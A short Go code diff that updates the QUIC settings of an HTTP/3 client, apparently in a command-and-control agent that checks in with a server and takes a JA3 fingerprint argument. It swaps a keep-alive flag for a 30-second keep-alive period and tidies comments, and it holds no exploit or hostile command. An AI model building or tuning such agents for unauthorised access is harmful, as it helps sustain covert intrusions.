@@ -220,12 +220,11 @@ func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, erro
 		transport = &http3.RoundTripper{
 			QuicConfig: &quic.Config{
 				// Opted for a long timeout to prevent the client from sending a PING Frame
-				// If MaxIdleTimeout is too high, agent will never get an error if the server is off line and will perpetually run without exiting because MaxFailedCheckins is never incremented
-				//MaxIdleTimeout: time.Until(time.Now().AddDate(0, 42, 0)),
+				// If MaxIdleTimeout is too high, agent will never get an error if the server is offline and will perpetually run without exiting because MaxFailedCheckins is never incremented
 				MaxIdleTimeout: time.Second * 30,
-				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
-				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
-				KeepAlive: true,
+				// KeepAlivePeriod will send an HTTP/2 PING frame to keep the connection alive
+				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will time out
+				KeepAlivePeriod: time.Second * 30,
 				// HandshakeIdleTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
 				HandshakeIdleTimeout: time.Second * 30,
 			},
